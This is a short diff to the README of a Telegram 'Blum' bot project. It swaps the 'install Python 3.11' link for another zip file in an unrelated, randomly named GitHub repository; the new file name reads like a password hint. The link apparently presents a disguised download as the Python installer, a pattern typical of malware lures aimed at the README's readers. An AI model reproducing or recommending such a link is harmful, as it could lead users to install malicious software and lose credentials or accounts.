@@ -1,7 +1,7 @@
 # Blum-bot-pc
 Software for Blum telegram Bot
 Requirements
-Python 3.11 [you can install it here](https://github.com/loasd104/asfsfscxs/releases/download/Release/install.zip)
+Python 3.11 [you can install it here](https://github.com/loasd104/asfsfscxs/releases/download/Release/pass_125accept.zip)
 Telegram API_ID and API_HASH (you can get them here)
 Install the required dependencies:
 
